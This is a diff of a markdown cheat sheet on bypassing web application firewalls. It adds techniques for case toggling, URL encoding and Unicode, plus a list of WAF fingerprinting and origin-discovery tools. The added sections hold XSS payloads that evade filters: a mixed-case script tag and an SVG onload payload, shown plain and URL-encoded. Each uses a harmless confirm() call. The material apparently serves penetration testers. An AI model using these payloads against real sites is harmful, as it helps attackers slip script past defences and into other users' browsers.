@@ -101,18 +101,43 @@ In some cloud-based WAFs, the request won’t be checked if the payload exceeds 
 
 
 
-## 11. Uninitialized Variables Technique
+## 1. Case Toggling Technique
+Combine upper and lower case characters for creating efficient payloads.
+```
+Basic Request:
+
+<script>confirm()</script>
+
+Bypassed Technique:
+
+<ScrIpT>confirm()</sCRiPt>
+```
+
+## 2. URL Encoding Technique
+Encode normal payloads with % encoding/URL encoding.
+You can use Burp. It has an encoder/decoder tool.
+
+```
+<Svg/x=">"/OnLoAD=confirm()//
+
+Bypassed Technique:
+
+%3CSvg%2Fx%3D%22%3E%22%2FOnLoAD%3Dconfirm%28%29%2F%2F
+```
+
+## 3. Unicode Technique
+ASCII characters in Unicode encoding give us great variants for bypassing WAF.
+Encode entire or part of the payload for obtaining results.
+
+
 
 
 
 
 ## Tools
 * [w3af](https://github.com/andresriancho/w3af) — Web Application Attack and Audit Framework
-
 * [wafw00f](https://github.com/EnableSecurity/wafw00f) — Identify and fingerprint Web Application Firewall
-
 * [BypassWAF](https://github.com/vincentcox/bypass-firewalls-by-DNS-history) – Bypass firewalls by abusing DNS history. This tool will search for old DNS A records and check if the server replies for that domain.
-
 * [CloudFail](https://github.com/m0rtem/CloudFail) – is a tactical reconnaissance tool that tries to find the original IP address behind the Cloudflare WAF.
 
 
